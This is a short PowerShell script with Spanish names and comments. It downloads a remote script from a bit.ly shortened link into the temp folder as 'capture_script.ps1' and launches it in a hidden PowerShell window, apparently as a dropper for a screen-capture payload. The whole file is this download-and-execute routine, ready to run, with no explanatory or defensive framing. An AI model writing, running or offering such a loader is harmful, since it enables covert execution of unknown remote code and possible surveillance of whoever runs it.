function DescargarYEjecutarScript {
    param (
        [string]$scriptUrl
    )

    if (-not $scriptUrl) {
        Write-Host "Debe proporcionar la URL del script a descargar." -ForegroundColor Red
        exit
    }

    $scriptPath = "$env:temp\capture_script.ps1"
    Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
    Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-File $scriptPath"
}

# Llamada a la función para descargar y ejecutar el script
DescargarYEjecutarScript -scriptUrl "https://bit.ly/Screen_dc"
